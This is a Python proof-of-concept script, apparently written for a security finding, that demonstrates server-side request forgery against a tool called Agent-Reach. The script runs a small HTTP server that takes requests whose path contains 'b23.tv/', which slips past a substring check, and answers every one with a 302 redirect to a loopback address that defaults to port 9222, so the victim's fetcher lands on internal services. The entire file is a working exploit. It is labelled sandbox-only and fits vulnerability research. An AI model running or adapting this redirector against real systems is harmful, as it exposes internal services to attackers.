#!/usr/bin/env python3
"""F6 redirect vector: an attacker-controlled server whose request path contains
`b23.tv/` (so Agent-Reach's substring gate passes) and which 302-redirects into a
loopback target. `urllib.request.urlopen` follows the redirect, so the server-side
request lands on the internal service.

    python3 ssrf_redirector.py <listen_port> <redirect_target_url>

SANDBOX ONLY.
"""
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer

TARGET = sys.argv[2] if len(sys.argv) > 2 else "http://127.0.0.1:9222/ssrf-via-redirect"


class Handler(BaseHTTPRequestHandler):
    def _redirect(self) -> None:
        print(f"[redirector] {self.command} {self.path}  ->  302 {TARGET}")
        self.send_response(302)
        self.send_header("Location", TARGET)
        self.send_header("Content-Length", "0")
        self.end_headers()

    def do_HEAD(self) -> None:
        self._redirect()

    def do_GET(self) -> None:
        self._redirect()

    def log_message(self, *a) -> None:
        pass


if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8899
    print(f"[redirector] on http://127.0.0.1:{port} (give it a path containing 'b23.tv/'); "
          f"302 -> {TARGET}")
    HTTPServer(("127.0.0.1", port), Handler).serve_forever()
